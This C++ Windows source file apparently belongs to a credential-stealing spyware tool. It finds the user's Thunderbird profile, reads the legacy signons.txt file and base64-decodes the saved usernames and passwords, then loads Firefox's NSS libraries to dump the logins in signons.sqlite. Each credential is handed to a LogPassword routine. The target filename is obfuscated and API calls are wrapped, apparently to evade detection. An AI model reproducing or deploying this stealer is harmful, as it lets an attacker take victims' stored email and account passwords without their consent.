
#define _CRT_SECURE_NO_WARNINGS 1

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <windows.h>

#include "base64.h"
#include "..\common.h"

// callback for the password
extern int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass);
extern int DirectoryExists(WCHAR *path);
extern int InitFFLibs(WCHAR *);
extern int InitializeNSSLibrary(WCHAR *);
extern void NSSUnload();
extern int DumpSqlFF(WCHAR *profilePath, WCHAR *signonFile);
extern WCHAR *DeobStringW(WCHAR *string);

// Function declarations..
WCHAR *GetTBProfilePath();

#define SAFE_FREE(x) do { if (x) {free(x); x=NULL;} } while (0);

extern WCHAR *UTF8_2_UTF16(char *str); // in firefox.cpp


int Decrypt(CHAR *cryptData, WCHAR *clearData, UINT clearSize)
{
	int decodeLen = 0;
	int finalLen = 0;
	char *decodeData = NULL;
	WCHAR *finalData = NULL;
	std::string b64Data = cryptData;
	std::string b64DecData;

	if (cryptData[0] == NULL )
		return 0;
	
    b64DecData = base64_decode(b64Data);

	finalData = UTF8_2_UTF16((char *)b64DecData.c_str());

	wcsncpy(clearData, finalData, clearSize);

	SAFE_FREE(finalData);

	return 1;
}


int DumpTB(WCHAR *profilePath, WCHAR *signonFile)
{
	WCHAR signonFullFile[MAX_PATH];
	char buffer[2048];
	int bufferLength = 2048;
	FILE *ft = NULL;

	struct tbp_entry {
		WCHAR service[64];
		WCHAR resource[255];
		WCHAR user_name[255];
		WCHAR user_value[255];
		WCHAR pass_name[255];
		WCHAR pass_value[255];
	} tbentry;

	memset(&tbentry, 0, sizeof(tbentry));

	if ( profilePath == NULL || signonFile == NULL)
		return 0;

	_snwprintf_s(signonFullFile, MAX_PATH, L"%s\\%s", profilePath, signonFile);

	if ( (ft = _wfopen(signonFullFile, L"r")) == NULL ) 
		 return 0;

	fgets(buffer, bufferLength, ft);

	// Read out the unmanaged ("Never remember" URL list
	while (fgets(buffer, bufferLength, ft) != 0) {
		// End of unmanaged list
		if (strlen(buffer) != 0 && buffer[0] == '.' && buffer[0] != '#')
			break;
	}

	// read the URL line
	while (fgets(buffer, bufferLength, ft) != 0 ){

		buffer[strlen(buffer)-1] = 0;
		//printf("-> URL: %s \n", buffer);
		swprintf_s(tbentry.service, 255, L"Thunderbird");
		_snwprintf_s(tbentry.resource, 255, _TRUNCATE, L"%S", buffer);

		//Start looping through final singon*.txt file
		while (fgets(buffer, bufferLength, ft) != 0 ) {

			// new entry begins with '.'
			if (!strncmp(buffer, ".", 1)) {
				if (wcscmp(tbentry.user_name, L""))
					LogPassword(tbentry.service, tbentry.resource, tbentry.user_value, tbentry.pass_value);
				
				memset(&tbentry.user_value, 0, sizeof(tbentry.user_value));
				memset(&tbentry.user_name, 0, sizeof(tbentry.user_name));
				memset(&tbentry.pass_value, 0, sizeof(tbentry.pass_value));
				memset(&tbentry.pass_name, 0, sizeof(tbentry.pass_name));
				
				break; // end of cache entry
			}

			//Check if its a password
			if (buffer[0] == '*') {
				buffer[strlen(buffer)-1] = 0;
				_snwprintf_s(tbentry.pass_name, 255, _TRUNCATE, L"%S", buffer + 1);
				
				fgets(buffer, bufferLength, ft);
				buffer[strlen(buffer)-1] = 0;
				
				Decrypt(buffer+1, tbentry.pass_value, 255);

			} else if (!wcscmp(tbentry.user_name, L"")) {
				buffer[strlen(buffer)-1] = 0;
				_snwprintf_s(tbentry.user_name, 255, _TRUNCATE, L"%S", buffer);

				fgets(buffer, bufferLength, ft);

				if (!strcmp(buffer, "~\n")) {
					// the username is inside the resource
					WCHAR *u;
					
					wcsncpy(tbentry.user_value, tbentry.resource, 255);

					if ((u = wcsstr(tbentry.user_value, L"://")) != NULL) {
						u += wcslen(L"://");
						swprintf_s(tbentry.user_value, 255, L"%s", u);
						if ((u = wcschr(tbentry.user_value, L'@')) != NULL)
							*u = 0;
					}
				} else {
					buffer[strlen(buffer)-1] = 0;
					Decrypt(buffer+1, tbentry.user_value, 255);
				}
			}
		}
	}

	fclose(ft);

	return 1;
}

WCHAR *GetTBLibPath()
{
	static WCHAR FullPath[MAX_PATH];
	char regSubKey[]    = "Software\\Classes\\Thunderbird.Url.mailto\\shell\\open\\command";
	char path[MAX_PATH];
	char *p;
	DWORD pathSize = MAX_PATH;
	DWORD valueType;
	HKEY rkey;

	// Open firefox registry key
	if( RegOpenKeyEx(HKEY_CURRENT_USER, regSubKey, 0, KEY_READ, &rkey) != ERROR_SUCCESS )
		return NULL;

	// Read the firefox path
	if( RegQueryValueEx(rkey, NULL, 0,  &valueType, (unsigned char*)&path, &pathSize) != ERROR_SUCCESS ) {
        RegCloseKey(rkey);
        return NULL;
    }

    if( pathSize <= 0 || path[0] == 0) {
		RegCloseKey(rkey);
		return NULL;
	}

	RegCloseKey(rkey);

	// get the path and then remove the initial \"
	if ((p = strrchr(path, '\\')) != NULL)
		*p = '\0';

	p = path;
	
	if( *p == '\"' ) 
		p++;

	if (!p)
		return NULL;

	_snwprintf_s(FullPath, MAX_PATH, L"%S", p);		

	return FullPath;
}

WCHAR *GetTBProfilePath()
{
	WCHAR appPath[MAX_PATH];
	WCHAR iniFile[MAX_PATH];
	WCHAR profilePath[MAX_PATH];
	static WCHAR FullPath[MAX_PATH];
	
	FNC(GetEnvironmentVariableW)(L"APPDATA", appPath, MAX_PATH);

	_snwprintf_s(iniFile, MAX_PATH, L"%s\\Thunderbird\\profiles.ini", appPath);
   
	FNC(GetPrivateProfileStringW)(L"Profile0", L"Path", L"",  profilePath, sizeof(profilePath), iniFile);

	_snwprintf_s(FullPath, MAX_PATH, L"%s\\Thunderbird\\%s", appPath, profilePath);

	return FullPath;
}


int DumpThunderbird(void)
{
	WCHAR *ProfilePath = NULL; 	//Profile path
	WCHAR *TBDir = NULL;   		//Thunderbird main installation path

	ProfilePath = GetTBProfilePath();

	if (!ProfilePath || !DirectoryExists(ProfilePath)) 
		return 0;

	// get the password for the old versions
	DumpTB(ProfilePath, L"signons.txt");   

	// get the password for the 3.1.x
	TBDir = GetTBLibPath();

	if (!TBDir || !DirectoryExists(TBDir)) 
		return 0;

	if (!InitFFLibs(TBDir))	
		return 0;

	if (!InitializeNSSLibrary(ProfilePath))
		return 0;

	DumpSqlFF(ProfilePath, DeobStringW(L"9Z71519.9ByZLI")); //"signons.sqlite"

	NSSUnload();

	return 0;
}
